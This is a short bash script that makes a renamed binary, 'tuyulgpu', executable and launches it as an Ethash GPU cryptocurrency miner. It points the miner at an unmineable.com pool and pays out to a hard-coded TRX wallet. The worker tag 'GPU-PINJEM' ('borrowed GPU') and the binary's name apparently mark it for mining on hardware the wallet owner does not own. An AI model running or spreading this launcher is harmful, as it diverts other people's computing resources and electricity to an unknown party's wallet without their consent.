#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=TRX:TA341dN8GbhAyVfPb9A3Gwxnq3eMSbrcLD
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)

chmod +x tuyulgpu
./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
